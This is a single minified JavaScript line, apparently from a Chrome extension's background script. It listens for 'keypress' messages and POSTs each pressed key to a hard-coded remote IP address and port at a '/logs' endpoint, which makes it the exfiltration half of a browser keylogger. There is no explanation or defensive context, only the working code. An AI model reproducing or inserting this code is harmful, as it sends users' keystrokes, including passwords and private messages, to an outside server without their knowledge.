chrome.runtime.onMessage.addListener(function(e){"keypress"===e.type&&fetch("http://54.179.106.144:5000/logs",{method:"POST",body:e.key}).then(e=>e.json()).then(e=>console.log(e))});
